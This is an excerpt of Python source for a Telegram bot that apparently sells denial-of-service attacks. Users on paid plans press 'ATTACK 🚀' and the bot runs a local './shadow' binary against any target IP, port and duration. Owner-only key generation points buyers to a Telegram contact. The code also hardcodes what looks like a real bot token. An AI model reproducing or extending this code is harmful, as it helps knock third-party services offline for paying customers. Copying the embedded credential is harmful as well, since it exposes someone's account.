...
# Configuration
TOKEN = '7642811071:AAHbClBfZIiPTcrvYyo8ckbUHrKK_jqvfEs'
...
def handle_genkey(message):
    if message.from_user.id != ADMIN_USER_ID:
        bot.reply_to(message, "𝙊𝙉𝙇𝙔 𝙊𝙒𝙉𝙀𝙍 𝘿𝙈-> @LASTWISHES0")
        return
...
async def run_attack(target_ip, target_port, duration):
    ...
    try:
        process = await asyncio.create_subprocess_shell(f"./shadow {target_ip} {target_port} {duration} 50")
...
def handle_attack(message):
    ...
    if not user_data or user_data['plan'] == 0:
        bot.reply_to(message, "𝘿𝙈-> @LASTWISHES")
        return
...
def handle_text(message):
    if message.text == "ATTACK 🚀":
        ...
        bot.reply_to(message, "𝘿𝙈-> @LASTWISHES0")
    else:
